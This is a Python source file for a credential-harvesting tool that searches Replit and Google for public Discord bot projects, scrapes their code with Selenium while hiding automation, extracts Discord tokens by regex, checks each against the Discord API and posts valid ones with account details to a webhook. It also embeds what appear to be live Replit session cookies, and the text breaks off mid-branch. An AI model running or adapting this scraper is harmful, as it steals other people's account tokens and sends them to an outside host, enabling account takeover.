import requests; from requests_html import HTMLSession; import asyncio; import urllib; from selenium import webdriver; import json; import time; import re; import chromedriver_binary;
def black(): return '\u001b[30;1m';
def red(): return '\u001b[31;1m';
def green(): return '\u001b[32;1m';
def yellow(): return '\u001b[33;1m';
def blue(): return '\u001b[34;1m';
def magenta(): return '\u001b[35;1m';
def cyan(): return '\u001b[36;1m';
def white(): return '\u001b[37;1m';
def reset(): return '\u001b[0m';
def b_black(): return '\u001b[40;1m';
def b_red(): return '\u001b[41;1m';
def b_green(): return '\u001b[42;1m';
def b_yellow(): return '\u001b[43;1m';
def b_blue(): return '\u001b[44;1m';
def b_magenta(): return '\u001b[45;1m';
def b_cyan(): return '\u001b[46;1m';
def b_white(): return '\u001b[47;1m';
class Ultimate:
    def __init__(self) -> None:
        try:
            with open("config.json", "r") as jsonfile: conf = json.load(jsonfile);
        except: print("Error while trying to open the 'config.json' file"); input(); exit(-1);
        self.current_queue:list = ["", 0]; self.q = ""; self.black_list:list = [];
        self.email, self.password, self.webhook = conf['email'], conf['pass'], conf['webhook'];
        self.results:list = []; self.forks:list = []; self.loop = asyncio.get_event_loop(); __import__("os").system("cls" if __import__("os").name == "nt" else "clear");
        self.cookies = {
    '_ga': 'GA1.2.1548094436.1687258921',
    '__stripe_mid': '01c59dce-7f09-4351-822a-9199fdcbde4e375c71',
    'connect.sid': 's%3AaTLBwa5Ho3gXxcb3-_-LYZRdYg8oXRkC.9DBfmS5%2FRkp6JLGIzqq3DyHUj6NIGCGKqe78V1JFuq0',
    'replit_authed': '1',
    'ajs_user_id': '8067797',
    'ajs_anonymous_id': '0260c35d-9c71-4a9a-9f59-4fa5106ac318',
    '_gid': 'GA1.2.726927294.1689691216',
    'amplitudeSessionId': '1689695127',
    '__stripe_sid': 'fa0318e0-3372-45a8-a360-d91e946202d487ed15',
    '__cf_bm': 'vY.mUiuxHus.Sz_JqjNzm7cU9P_6JAZRNv78zBcrPBQ-1689695291-0-AYzDWClk/mRZK5FCrmqQgzBin+MtH2ApHDagETw1k8Mjztvs+on+jn4OHZSkNP219aSiZlvLk7ZADN1TXELouew=',
    '_cfuvid': 'I9.2cRDqApmvrKE5IW063LMk23YR.rR5BQh3IFCeTqI-1689695291192-0-604800000',
    '_dd_s': 'logs=1&id=836ec6e2-d827-4591-9486-b68d2cc3affe&created=1689695127432&expire=1689696249897&rum=0',
}; self.headers = {
            'authority': 'replit.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://replit.com',
            'referer': 'https://replit.com/search?query=selfbot&category=Repls&page=1&hasCurrentUser=false',
            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'x-client-version': 'a0f683d',
            'x-requested-with': 'XMLHttpRequest'
        };
        opt_ = webdriver.ChromeOptions(); opt_.add_experimental_option("detach", True);
        opt_.add_argument("--disable-blink-features=AutomationControlled"); opt_.add_experimental_option("excludeSwitches", ["enable-automation"]);
        opt_.add_experimental_option("useAutomationExtension", False); opt_.add_argument("start-maximized"); 
        self.driver = webdriver.Chrome(options=opt_); 
        pass;
    def __webhook__(self, token:str, line:str):
        header_ = {"Authorization": token}; valid:bool = True;
        try:
            _check = requests.get("https://discord.com/api/v9/users/@me", headers=header_);
        except requests.exceptions.InvalidHeader: print("Couldn't read the token: '%s' " % token); return;
        if _check.ok: fields = ["||@everyone||", _check.json()['username'], _check.json()['id'], "True", "User"];
        else:
            header_ = {"Authorization": "Bot %s" % token}; _rr = requests.get("https://discord.com/api/v9/users/@me", headers=header_);

            if _rr.ok: fields = ["||@everyone||", _rr.json()['username'], _rr.json()['id'], "True", "Bot"];
            else: fields = ["** **", "None", "None", "False", "Unknown"]; valid = False;
        if valid:
            server = len(requests.get('https://discord.com/api/v9/users/@me/guilds', headers=header_).json());
        else: server = "Unknown";
        message = {"content": fields[0], "embeds":[{"title": f"`{fields[1]}` - `{fields[2]}`","description": f"\n**Token**\n> `{token}`\n\n**Extra Info**\n> `{line if len(line) < 1000 else 'None'}`","color":5814783,"fields":[{"name":"Valid","value":f"`{fields[3]}`","inline":True},{"name":"Type","value":f"`{fields[4]}`","inline":True},{"name":"Server Count","value":f"`{server}`","inline":True}]}],"attachments":[]}
        print(requests.post(self.webhook, json=message).status_code);
        return;
    def __repl_r(self, json:set) -> set:
        try:
            r = requests.post("https://replit.com/graphql", cookies=self.cookies, headers=self.headers, json=json);
            if r.ok: return r.json();
            return [];
        except requests.exceptions.ConnectionError:
            print("Requests died"); exit(-1);
    async def __async__search__(self, queries:str=["selfbot", "music bot"], all:str=True):
        date = "%sT10:52:08.198Z" % str(__import__("datetime").date.today()-__import__("datetime").timedelta(days=1));
        async def __gather__query(query):
            print("Current Query: %s " % query);
            json_data = [
                {
                    'operationName': 'SearchPageSearchResults',
                    'variables': {
                        'options': {
                            'onlyCalculateHits': False,
                            'categories': [
                                'Repls',
                            ],
                            'query': query,
                            'categorySettings': {
                                'repls': {
                                    'page': {
                                        'first': 10,
                                        'after': '1',
                                    },
                                    'sort': 'Relevant',
                                    'dateCreated': {
                                        'gte': date,
                                    },
                                    'tags': [],
                                    'exactMatch': False,
                                },
                                'posts': {
                                    'sort': 'Relevant',
                                    'exactMatch': False,
                                },
                                'templates': {
                                    'exactMatch': False,
                                },
                                'docs': {},
                                'files': {
                                    'sort': 'Relevant',
                                    'exactMatch': False,
                                    'myCode': False,
                                },
                                'users': {},
                            },
                        },
                    },
                    'query': 'query SearchPageSearchResults($options: SearchQueryOptions!) {\n  search(options: $options) {\n    ...SearchPageResults\n    ... on UserError {\n      message\n      __typename\n    }\n    ... on UnauthorizedError {\n      message\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment SearchPageResults on SearchQueryResults {\n  userResults {\n    hitInfo {\n      ...HitInfo\n      __typename\n    }\n    results {\n      pageInfo {\n        ...PageInfo\n        __typename\n      }\n      items {\n        id\n        ...SearchPageResultsUser\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  replResults {\n    hitInfo {\n      ...HitInfo\n      __typename\n    }\n    results {\n      pageInfo {\n        ...PageInfo\n        __typename\n      }\n      items {\n        id\n        ...SearchPageResultsRepl\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  templateResults {\n    hitInfo {\n      ...HitInfo\n      __typename\n    }\n    results {\n      pageInfo {\n        ...PageInfo\n        __typename\n      }\n      items {\n        id\n        ...SearchPageResultsTemplate\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  postResults {\n    hitInfo {\n      ...HitInfo\n      __typename\n    }\n    results {\n      pageInfo {\n        ...PageInfo\n        __typename\n      }\n      items {\n        id\n        ...SearchPageResultsPost\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  docResults {\n    hitInfo {\n      ...HitInfo\n      __typename\n    }\n    results {\n      pageInfo {\n        ...PageInfo\n        __typename\n      }\n      items {\n        ...SearchPageResultsDoc\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  fileResults {\n    hitInfo {\n      ...HitInfo\n      __typename\n    }\n    results {\n      pageInfo {\n        ...PageInfo\n        __typename\n      }\n      items {\n        ...SearchPageResultsFile\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment HitInfo on SearchQueryHitInfo {\n  totalHits\n  totalPages\n  __typename\n}\n\nfragment PageInfo on PageInfo {\n  hasPreviousPage\n  hasNextPage\n  nextCursor\n  previousCursor\n  __typename\n}\n\nfragment SearchPageResultsUser on User {\n  id\n  username\n  fullName\n  bio\n  image\n  url\n  ...UserRoles\n  __typename\n}\n\nfragment UserRoles on User {\n  roles(\n    only: [ADMIN, MODERATOR, PATRON, PYTHONISTA, DETECTIVE, LANGUAGE_JAMMER, FEATURED, REPLIT_REP, REPLIT_REP_EDU]\n  ) {\n    id\n    name\n    key\n    tagline\n    __typename\n  }\n  __typename\n}\n\nfragment SearchPageResultsRepl on Repl {\n  id\n  ...ReplPostReplCardRepl\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment SearchPageResultsTemplate on Repl {\n  id\n  ...TemplateReplCardRepl\n  __typename\n}\n\nfragment TemplateReplCardRepl on Repl {\n  id\n  iconUrl\n  templateCategory\n  title\n  description(plainText: true)\n  releasesForkCount\n  templateLabel\n  likeCount\n  url\n  owner {\n    ... on User {\n      id\n      ...TemplateReplCardFooterUser\n      __typename\n    }\n    ... on Team {\n      id\n      ...TemplateReplCardFooterTeam\n      __typename\n    }\n    __typename\n  }\n  deployment {\n    id\n    activeRelease {\n      id\n      __typename\n    }\n    __typename\n  }\n  publishedAs\n  __typename\n}\n\nfragment TemplateReplCardFooterUser on User {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment TemplateReplCardFooterTeam on Team {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment SearchPageResultsPost on Post {\n  id\n  ...ReplPostPost\n  ...ReplCardPostPost\n  ...OldPostPost\n  __typename\n}\n\nfragment ReplPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  ...ReplViewPostActionPermissions\n  replComment {\n    id\n    body(removeMarkdown: true)\n    __typename\n  }\n  repl {\n    id\n    ...ReplViewReplActionsPermissions\n    ...ReplPostRepl\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewPostActionPermissions on Post {\n  id\n  isHidden\n  __typename\n}\n\nfragment ReplViewReplActionsPermissions on Repl {\n  id\n  slug\n  lastPublishedAt\n  publishedAs\n  owner {\n    ... on User {\n      id\n      username\n      __typename\n    }\n    ... on Team {\n      id\n      username\n      __typename\n    }\n    __typename\n  }\n  templateReview {\n    id\n    promoted\n    __typename\n  }\n  currentUserPermissions {\n    publish\n    containerWrite\n    __typename\n  }\n  ...UnpublishReplRepl\n  ...ReplLinkRepl\n  __typename\n}\n\nfragment UnpublishReplRepl on Repl {\n  id\n  commentCount\n  likeCount\n  runCount\n  publishedAs\n  __typename\n}\n\nfragment ReplPostRepl on Repl {\n  id\n  ...ReplPostReplInfoRepl\n  ...LikeButtonRepl\n  ...ReplStatsRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplPostUserPostUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment UserLinkUser on User {\n  id\n  url\n  username\n  __typename\n}\n\nfragment ReplPostReplComment on ReplComment {\n  id\n  body\n  timeCreated\n  user {\n    id\n    ...ReplPostRecentCommentUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostRecentCommentUser on User {\n  id\n  username\n  image\n  ...UserLinkUser\n  __typename\n}\n\nfragment ReplCardPostPost on Post {\n  id\n  title\n  timeCreated\n  isPinned\n  isAnnouncement\n  ...ReplViewPostActionPermissions\n  repl {\n    id\n    ...ReplViewReplActionsPermissions\n    ...ReplCardPostRepl\n    __typename\n  }\n  recentReplComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  __typename\n}\n\nfragment ReplCardPostRepl on Repl {\n  id\n  ...LikeButtonRepl\n  ...ReplPostReplCardRepl\n  recentComments {\n    id\n    ...ReplPostReplComment\n    __typename\n  }\n  __typename\n}\n\nfragment OldPostPost on Post {\n  id\n  title\n  preview(removeMarkdown: true, length: 150)\n  url\n  commentCount\n  isPinned\n  isAnnouncement\n  timeCreated\n  ...PostLinkPost\n  user {\n    id\n    ...ReplPostUserPostUser\n    __typename\n  }\n  repl {\n    id\n    ...ReplPostRepl\n    __typename\n  }\n  board {\n    id\n    name\n    color\n    __typename\n  }\n  recentComments(count: 3) {\n    id\n    preview(removeMarkdown: true, length: 500)\n    timeCreated\n    user {\n      id\n      ...ReplPostRecentCommentUser\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment PostLinkPost on Post {\n  id\n  url\n  __typename\n}\n\nfragment SearchPageResultsDoc on SearchResultIndexedDoc {\n  path\n  section\n  contents\n  contentMatches {\n    start\n    length\n    __typename\n  }\n  __typename\n}\n\nfragment SearchPageResultsFile on SearchResultIndexedFile {\n  repl {\n    id\n    title\n    iconUrl\n    url\n    owner {\n      ... on User {\n        id\n        image\n        username\n        __typename\n      }\n      ... on Team {\n        id\n        image\n        username\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  filePath\n  fileContents\n  fileContentMatches {\n    start\n    length\n    __typename\n  }\n  __typename\n}\n',
                },
            ];
            if all:
                json_data[0]['variables']['options']['categorySettings']['repls'] = {'page': {
                    'first': 10,
                    'after': '1',
                    }, 'sort': 'Relevant',
                    'tags': [], 'exactMatch': False
                };
            try:
                for _ in self.__repl_r(json_data)[0]['data']['search']['replResults']['results']['items']:
                    try:
                        self.results.append("https://replit.com%s" % _['url']);
                    except KeyError: pass;
            except IndexError or KeyError: pass;
        await asyncio.gather(*[__gather__query(query) for query in queries]);
        return self.results;
    def __search__(self, queries:str=["selfbot", "music bot", "exeter", "discord bot", "moderation bot"], all:str=True): return self.loop.run_until_complete(self.__async__search__(queries=queries, all=all));
    def __dorks_repls__(self, query:list=["discord"]) -> list:
        try:
            links = list(HTMLSession().get("https://www.google.com/search?q=%s site:replit.com" % urllib.parse.quote_plus("".join([i+"+" for i in query])[:-1])).html.absolute_links);
        except requests.exceptions.RequestException: return [];
        for url in links:
            if "replit" in str(url).lower() and not "google" in str(url).lower() and not "talk" in str(url).lower() and not "community" in str(url).lower() and not "tutorials" in str(url).lower() and not "?tab=repls" in str(url).lower() and "@" in str(url).lower() and len(["/" for _ in url if "/" in _])!=3: self.results.append(url);
        return self.results;
    def __get_files__(self, url:str) -> list:
        if self.current_queue[1] > 4:
            self.q = url.split("/")[len(url.split("/"))-1];
            if self.current_queue[0].startswith(self.q):
                self.black_list.append(self.current_queue[0]); return [];
            else: self.current_queue[1] = 0;
        self.current_queue[0] = url.split("/")[len(url.split("/"))-1];   
        self.driver.get(url);
        def tenkai():
            y = self.driver.execute_script('''
var tenkai = [];
function waitForElm(selector) {
    return new Promise(resolve => {
        if (document.querySelector(selector)) {
            return resolve(document.querySelector(selector));
        };
        const observer = new MutationObserver(mutations => {
            if (document.querySelector(selector)) {
                resolve(document.querySelector(selector));
                observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
};
waitForElm("#main-content > div > div > div > div > div > button").then((elm) => {
    if (elm.textContent == "Show code") {
        elm.click();
    }
});
waitForElm("#main-content > div > div > div > div > div > div > div > div > div > div > div > div > div").then((elm) => {
    document.querySelectorAll("#main-content > div > div > div > div > div > div > div > div > div > div > div > div > div").forEach((item)=>{tenkai.push(item.textContent)});
});
return tenkai;
''');
            if 'loading' in str(y).lower(): time.sleep(2); return tenkai();
            return list(set([i.lower() for i in y]));
        return tenkai();
    def __fetch_forks__(self, url:str) -> list:
        self.results = sorted(set(self.results)); retry:int = 0;
        def single_fork(url, retry=0):
            if retry == 5: print("Skipped"); return;
            try:
                print("Getting forks for %s .." % url)
                for _ in self.__repl_r([
                    {
                        'operationName': 'PublicForks',
                        'variables': {
                            'replId': self.__repl_r(
                                [{"operationName":"ReplView", "variables":{"url":url}, "query":"query ReplView($url: String!) {\n  repl(url: $url) {\n    ... on Repl {\n      id\n      imageUrl\n      ...ReplViewRepl\n      __typename\n    }\n    __typename\n  }\n  currentUser {\n    id\n    ...ReplViewCurrentUser\n    __typename\n  }\n}\n\nfragment ReplViewRepl on Repl {\n  id\n  title\n  timeCreated\n  imageUrl\n  publicReleasesForkCount\n  publicForkCount\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  relatedRepls(limitPerGroup: 3) {\n    name\n    repls {\n      id\n      publishedAs\n      ...ReplLinkRepl\n      ...TemplateReplCardRepl\n      ...ReplPostReplCardRepl\n      __typename\n    }\n    __typename\n  }\n  lang {\n    id\n    displayName\n    __typename\n  }\n  currentUserPermissions {\n    containerWrite\n    publish\n    changeIconUrl\n    __typename\n  }\n  publishedAs\n  deployment {\n    id\n    activeRelease {\n      id\n      timeCreated\n      __typename\n    }\n    __typename\n  }\n  ...ReplViewReplTitleRepl\n  ...ReplViewReplViewerRepl\n  ...ReplLinkRepl\n  ...ReplViewFooterRepl\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment TemplateReplCardRepl on Repl {\n  id\n  iconUrl\n  templateCategory\n  title\n  description(plainText: true)\n  publicReleasesForkCount\n  templateLabel\n  likeCount\n  url\n  owner {\n    ... on User {\n      id\n      ...TemplateReplCardFooterUser\n      __typename\n    }\n    ... on Team {\n      id\n      ...TemplateReplCardFooterTeam\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment TemplateReplCardFooterUser on User {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment TemplateReplCardFooterTeam on Team {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment ReplViewReplTitleRepl on Repl {\n  id\n  title\n  iconUrl\n  templateInfo {\n    iconUrl\n    __typename\n  }\n  owner {\n    ... on User {\n      id\n      username\n      __typename\n    }\n    ... on Team {\n      id\n      username\n      __typename\n    }\n    __typename\n  }\n  ...ReplViewReplActionsPermissions\n  __typename\n}\n\nfragment ReplViewReplActionsPermissions on Repl {\n  id\n  lastPublishedAt\n  publishedAs\n  templateReview {\n    id\n    promoted\n    __typename\n  }\n  currentUserPermissions {\n    publish\n    __typename\n  }\n  ...UnpublishReplRepl\n  __typename\n}\n\nfragment UnpublishReplRepl on Repl {\n  id\n  commentCount\n  likeCount\n  runCount\n  publishedAs\n  __typename\n}\n\nfragment ReplViewReplViewerRepl on Repl {\n  id\n  publishedAs\n  runCount\n  publicForkCount\n  publicReleasesForkCount\n  prodUrl: hostedUrl(dotty: true)\n  isProject\n  nextPagePathname\n  lang {\n    id\n    header\n    displayName\n    __typename\n  }\n  ...ReplViewerOutputOverlayRepl\n  ...UseReplViewerRepl\n  ...LikeButtonRepl\n  __typename\n}\n\nfragment ReplViewerOutputOverlayRepl on Repl {\n  id\n  title\n  imageUrl\n  lastPublishedAt\n  currentUserPermissions {\n    changeImageUrl\n    __typename\n  }\n  __typename\n}\n\nfragment UseReplViewerRepl on Repl {\n  id\n  previewUrl: hostedUrl(dotty: false, dev: false)\n  url\n  wasPosted\n  wasPublished\n  publishedAs\n  isProject\n  lang {\n    id\n    canUseShellRunner\n    hasReplboxWebview\n    __typename\n  }\n  config {\n    isServer\n    isVnc\n    __typename\n  }\n  deployment {\n    id\n    activeRelease {\n      id\n      previewUrl: hostedUrl\n      __typename\n    }\n    __typename\n  }\n  replViewSettings {\n    id\n    defaultView\n    replFile\n    __typename\n  }\n  ...CrosisContextRepl\n  __typename\n}\n\nfragment CrosisContextRepl on Repl {\n  id\n  language\n  slug\n  user {\n    id\n    username\n    __typename\n  }\n  currentUserPermissions {\n    containerWrite\n    __typename\n  }\n  flagOwnerDotReplitPackager: gateOnOwner(feature: \"flag-dotreplit-packager\")\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplViewFooterRepl on Repl {\n  id\n  description\n  lastPublishedAt\n  publishedAs\n  deployment {\n    id\n    activeRelease {\n      id\n      timeCreated\n      __typename\n    }\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      followerCount\n      isFollowedByCurrentUser\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      followerCount\n      isFollowedByCurrentUser\n      __typename\n    }\n    __typename\n  }\n  source {\n    release {\n      id\n      __typename\n    }\n    deployment {\n      id\n      repl {\n        id\n        ...ReplViewSourceRepl\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  tags {\n    id\n    __typename\n  }\n  origin {\n    id\n    ...ReplViewSourceRepl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewSourceRepl on Repl {\n  id\n  iconUrl\n  title\n  templateLabel\n  ...ReplLinkRepl\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewCurrentUser on CurrentUser {\n  id\n  username\n  isSubscribed\n  isModerator: hasRole(role: MODERATOR)\n  isAdmin: hasRole(role: ADMIN)\n  ...ReplViewReplViewerCurrentUser\n  __typename\n}\n\nfragment ReplViewReplViewerCurrentUser on CurrentUser {\n  id\n  ...LikeButtonCurrentUser\n  ...CrosisContextCurrentUser\n  __typename\n}\n\nfragment LikeButtonCurrentUser on CurrentUser {\n  id\n  isVerified\n  __typename\n}\n\nfragment CrosisContextCurrentUser on CurrentUser {\n  id\n  username\n  isSubscribed\n  flagTrackOtClientDataLoss: gate(feature: \"flag-ot-data-loss-client-tracking\")\n  flagPid1Ping: gate(feature: \"flag-pid1-ping-sample\")\n  flagNoPongReconnect: gate(feature: \"flag-no-pong-reconnect\")\n  __typename\n}\n"}],
                                )[0]['data']['repl']['id'], 'count': 100, },
                                'query': 'query PublicForks($replId: String!, $count: Int!, $after: String, $search: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      releasesForkCount\n      publicForks(count: $count, after: $after, search: $search) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n',
                }])[0]['data']['repl']['publicForks']['items']:
                    self.forks.append("https://replit.com"+_['url']); retry = 0;
            except IndexError: return single_fork(url, retry+1);
        single_fork(url, retry); return self.forks;
    def __login__(self):
        self.driver.get("https://replit.com/login"); time.sleep(1);
        self.driver.execute_script('''
function waitForElm(selector) {
    return new Promise(resolve => {
        if (document.querySelector(selector)) {
            return resolve(document.querySelector(selector));
        };
        const observer = new MutationObserver(mutations => {
            if (document.querySelector(selector)) {
                resolve(document.querySelector(selector));
                observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
};
waitForElm("#__next > div > div > div > main > div > div > div > button:nth-child(2)").then((elm) => {
    elm.click();
});
''');
        try:
            self.driver.switch_to.window(self.driver.window_handles[1]);
        except Exception as x: print("Something went wrong! Retrying in '10' seconds.."); time.sleep(10); return self.__login__();
        self.driver.execute_script('''
document.querySelector("#login_field").value = \"%s\"; document.querySelector("#password").value = \"%s\";
function waitForElm(selector) {
    return new Promise(resolve => {
        if (document.querySelector(selector)) {
            return resolve(document.querySelector(selector));
        };
        const observer = new MutationObserver(mutations => {
            if (document.querySelector(selector)) {
                resolve(document.querySelector(selector));
                observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
};
waitForElm("#login > div.auth-form-body.mt-3 > form > div > input.btn.btn-primary.btn-block.js-sign-in-button").then((elm) => {
    elm.click();
});
        ''' % (self.email, self.password)); self.driver.switch_to.window(self.driver.window_handles[0]);
        return;
    def __scrape_token__(self, url:str, files:list=[]) -> str:
        print(self.current_queue)
        if files == []: return;
        found:bool = False; last_token:str = "";
        for file in files:
            if file == "" or "There is nothing here" in file or file.startswith(".") or not "." in file or ".png" in file or ".jpeg" in file or ".mp4" in file: continue;
            filess = "%s#%s" % (url, file);
            self.driver.get(filess);
            def parse_code():
                code = self.driver.execute_script('''
return document.querySelector("#main-content > div > div > div > div > div > div > div").textContent;
''');
                if code == "": time.sleep(0x3); return parse_code();
                return code;
            for line in parse_code().splitlines():
                if len(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)):
                    for second_line in line.split('\"' if '\"' in str(line) else "\'"):
                        if len(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', second_line)):
                            token = second_line.replace(",", "").replace("'", "").replace(" ", "");
                            if last_token == token: break;
                            else: last_token = token;
                            print(token); self.__webhook__(token, line); self.current_queue[1] = 0; found = True;
        if not found:
            self.current_queue[1]+=1;
        return;    

if __name__ == "__main__":
    print('''
%s
         _              _                   _      _                  _   _          _      
        /\_\           / /\                /\ \   /\_\               /\_\/\_\ _     /\ \    
       / / /  _       / /  \              /  \ \ / / /         _    / / / / //\_\   \ \ \   
      / / /  /\_\    / / /\ \            / /\ \ \\\\ \ \__      /\_\ /\ \/ \ \/ / /   /\ \_\  
     / / /__/ / /   / / /\ \ \          / / /\ \_\\\\ \___\    / / //  \____\__/ /   / /\/_/  
    / /\_____/ /   / / /  \ \ \        / / /_/ / / \__  /   / / // /\/________/   / / /     
   / /\_______/   / / /___/ /\ \      / / /__\/ /  / / /   / / // / /\/_// / /   / / /      
  / / /\ \ \     / / /_____/ /\ \    / / /_____/  / / /   / / // / /    / / /   / / /       
 / / /  \ \ \   / /_________/\ \ \  / / /\ \ \   / / /___/ / // / /    / / /___/ / /__      
/ / /    \ \ \ / / /_       __\ \_\/ / /  \ \ \ / / /____\/ / \/_/    / / //\__\/_/___\     
\/_/      \_\_\\\\_\___\     /____/_/\/_/    \_\/ \/_________/          \/_/ \/_________/     
%s                                                                                            
                 [ The Tool Is Still In Beta - Updates In The Future]

''' % (blue(), reset()));
    search_term = []; print("[ Search term examples: %s'selfbot', 'music bot', 'discord bot'%s ]\n[ Type '%s-costum%s' to scan costum repl links, anything else to ignore ]" % (blue(), reset(), green(), reset()));
    i:int = 0; costum = input("[%s!%s] > " % (blue(), reset()));
    if costum.lower() == "-costum":
        ultimate = Ultimate(); __import__("os").system("cls" if __import__("os").name == "nt" else "clear");
        while True:
            p = input("[%s%s%s] Insert url [Leave blank to stop ] > " % (green(), i, reset()));
            if not p == "": ultimate.results.append(p); i+=1;
            else: break;
    else: 
        while True:
            p = input("[%s%s%s] Input search term [Leave blank to stop ] > " % (blue(), i, reset()));
            if not p == "": search_term.append(p); i+=1;
            else: break;
        last = input("[ %sGoogle%s Dork (g), %sReplit%s Search (p), %sBoth%s (anything) ] > " % (yellow(), reset(), green(), reset(), magenta(), reset())).lower();
        ultimate = Ultimate(); __import__("os").system("cls" if __import__("os").name == "nt" else "clear");
        if last == "g":
            ultimate.__dorks_repls__(search_term);
        elif last == "p":
